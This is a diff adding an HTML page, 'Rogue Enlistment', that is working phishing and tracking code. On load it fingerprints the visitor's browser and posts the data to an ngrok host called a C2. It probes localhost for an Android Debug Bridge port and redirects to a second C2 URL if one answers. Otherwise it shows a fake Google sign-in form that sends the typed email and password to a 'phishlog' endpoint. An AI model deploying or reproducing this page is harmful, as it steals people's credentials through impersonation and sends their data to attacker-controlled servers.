@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Rogue Enlistment</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      background: black;
+      color: #00ffcc;
+      font-family: monospace;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+    }
+    h1 { font-size: 22px; margin-bottom: 10px; }
+    p { font-size: 14px; color: #ccc; }
+    input {
+      margin: 6px 0;
+      padding: 8px;
+      width: 80%;
+      max-width: 250px;
+      border: none;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+    button {
+      margin-top: 8px;
+      padding: 8px 20px;
+      font-size: 14px;
+      border: none;
+      background: #00ffcc;
+      color: black;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    #phishForm {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <h1>📡 Connecting to Rogue C2...</h1>
+  <p>Attempting secure beacon handshake</p>
+
+  <div id="phishForm">
+    <h1>🔐 Google Sign-in Required</h1>
+    <form onsubmit="sendPhish(event)">
+      <input type="email" placeholder="Email or phone" id="user" required><br>
+      <input type="password" placeholder="Enter your password" id="pass" required><br>
+      <button type="submit">Next</button>
+    </form>
+  </div>
+
+  <script>
+    const info = {
+      id: navigator.userAgent,
+      screen: `${screen.width}x${screen.height}`,
+      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      platform: navigator.platform,
+      lang: navigator.language,
+      timestamp: new Date().toISOString()
+    };
+
+    // Log Rogue C2 join
+    fetch("https://rogue-c2.ngrok.app/join", {
+      method: "POST",
+      body: JSON.stringify(info),
+      headers: { "Content-Type": "application/json" }
+    });
+
+    // ADB check
+    fetch("http://127.0.0.1:5555")
+      .then(() => {
+        window.location.href = "https://eva-c2.ngrok.app/connect?type=adb";
+      })
+      .catch(() => {
+        // After delay, show phishing form
+        setTimeout(() => {
+          document.getElementById("phishForm").style.display = "flex";
+        }, 2000);
+      });
+
+    function sendPhish(e) {
+      e.preventDefault();
+      const data = {
+        user: document.getElementById("user").value,
+        pass: document.getElementById("pass").value,
+        ua: navigator.userAgent,
+        ts: new Date().toISOString()
+      };
+
+      fetch("https://pwn-tag.ngrok.app/phishlog", {
+        method: "POST",
+        body: JSON.stringify(data),
+        headers: { "Content-Type": "application/json" }
+      });
+
+      document.body.innerHTML = "<h1>🔍 Verifying credentials...</h1><p>Please wait...</p>";
+    }
+  </script>
+</body>
+</html>
